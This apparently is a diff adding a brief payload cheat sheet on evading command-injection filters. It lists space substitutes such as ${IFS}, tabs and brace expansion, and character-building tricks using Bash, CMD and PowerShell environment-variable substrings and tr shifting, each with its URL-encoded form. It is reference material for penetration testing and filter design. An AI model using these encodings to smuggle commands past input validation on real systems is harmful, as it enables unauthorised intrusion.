@@ -1,0 +1,20 @@
+##### Bypassing space filters #####
+Tab                           Tab                    %09                           ALL
+Linux env vars                ${IFS}                 %24%7BIFS%7D                  BASH
+Bash brace expansion          {ls,-la}               %7Bls%2C-la%7D                BASH
+
+
+
+##### Bypassing chars filters #####
+env vars                       ${PATH:0:1}            %24%7BPATH%3A0%3A1%7D         BASH
+Chars shifting                 $(tr '!-}' '"-~'<<<[)                                BASH                    watching ascii table with man ascii
+CMD env vars                   %HOMEPATH:~6,-11%      %25HOMEPATH%3A~6%2C-11%25     CMD
+PS env vars                    $env:HOMEPATH[0]       %24env%3AHOMEPATH%5B0%5D      Powershell                        
+
+
+
+
+
+
+
+
